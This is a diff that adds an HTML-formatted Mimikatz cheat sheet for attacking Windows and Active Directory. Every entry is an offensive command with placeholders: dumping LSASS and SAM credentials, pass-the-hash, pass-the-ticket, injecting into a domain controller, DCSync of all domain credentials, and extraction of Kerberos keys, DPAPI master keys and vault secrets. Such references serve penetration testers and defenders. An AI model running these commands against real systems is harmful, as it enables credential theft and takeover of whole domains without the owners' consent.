@@ -1,0 +1,51 @@
+<strong><span style="font-size: 20px;">Mimikatz.exe Cheat Sheet: </span></strong><span style="font-size: 20px;"><strong><span style="color: rgb(85, 57, 130);">(thank you to <a href="https://medium.com/@dw3113r/active-directory-attack-cheat-sheet-ea9e9744028d">@dw3113r</a> for this cheatsheet)</span></strong></span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(97, 189, 109);">#Dump LSASS:</span>
+</strong>mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz sekurlsa::logonpasswords</span>
+<span style="font-size: 20px;">
+<strong><span style="color: rgb(0, 0, 0); background-color: rgb(247, 218, 100);">#(Over) Pass The Hash
+</span></strong>mimikatz privilege::debug
+mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(61, 142, 185);">#List all available kerberos tickets in memory</span>
+</strong>mimikatz sekurlsa::tickets</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(251, 160, 38);">#Dump local Terminal Services credentials</span>
+</strong>mimikatz sekurlsa::tspkg</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(147, 101, 184);">#Dump and save LSASS in a file</span>
+</strong>mimikatz sekurlsa::minidump c:\temp\lsass.dmp</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(235, 107, 86);">#List cached MasterKeys</span>
+</strong>mimikatz sekurlsa::dpapi</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(247, 218, 100);">#List local Kerberos AES Keys</span>
+</strong>mimikatz sekurlsa::ekeys</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(204, 204, 204);">#Dump SAM Database</span>
+</strong>mimikatz lsadump::sam</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(0, 168, 133);">#Dump SECRETS Database</span>
+</strong>mimikatz lsadump::secrets</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(226, 80, 65);">#Inject and dump the Domain Controller&rsquo;s Credentials</span>
+</strong>mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz lsadump::lsa /inject</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(163, 143, 132);">#Dump the Domain&rsquo;s Credentials without touching DC&rsquo;s LSASS and also remotely</span>
+</strong>mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(97, 189, 109);">#List and Dump local kerberos credentials</span>
+</strong>mimikatz kerberos::list /dump</span>
+<span style="font-size: 20px;"><span style="color: rgb(0, 0, 0);">
+</span><strong><span style="color: rgb(0, 0, 0); background-color: rgb(235, 107, 86);">#Pass The Ticket</span>
+</strong>mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(147, 101, 184);">#List TS/RDP sessions</span>
+</strong>mimikatz ts::sessions</span>
+<span style="font-size: 20px;">
+<strong><span style="background-color: rgb(243, 121, 52);">#List Vault credentials</span>
+</strong>mimikatz vault::list</span></pre>
